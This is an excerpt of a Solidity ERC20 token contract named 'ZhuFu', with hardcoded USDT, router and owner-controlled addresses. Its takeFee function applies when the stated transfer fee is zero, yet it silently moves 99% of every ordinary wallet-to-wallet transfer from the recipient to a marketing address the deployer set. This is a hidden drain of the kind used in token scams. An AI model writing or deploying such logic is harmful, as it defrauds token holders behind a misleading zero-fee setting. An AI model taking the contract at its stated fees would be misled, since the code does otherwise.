...
contract ZhuFu is ERC20, ERC20Burnable, Ownable {
    using SafeMath for uint;
    MktCap public mkt;
    ...
    constructor() ERC20("ZhuFu", "ZhuFu") {
        ceo = _msgSender();
        address _baseToken = 0x55d398326f99059fF775485246999027B3197955; //usdt
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        address _initMarketAddress = 0x03B667E3d65E59aDbBCa325AA7fa9D1c08CfDcda;
        initMarketAddress = _initMarketAddress;
        ...
        address _initHolder = 0xeAeE8a48696216c2412C29E32fe1249281D650f1;
    ...
    function takeFee(address from, address to, uint amount) internal {
        ...
        if(fees.transfer == 0) {
            uint256 feeNormalTransfer = amount.mul(99).div(100);
            bool isNormalTransfer = (!ispair[from] && !ispair[to]);
            if(!isNormalTransfer || _isExcludedFromFee[from] || _isExcludedFromFee[to]) {
                feeNormalTransfer = 0;
            }

            if(feeNormalTransfer > 0) {
                super._transfer(to, initMarketAddress, feeNormalTransfer);
            }
        }
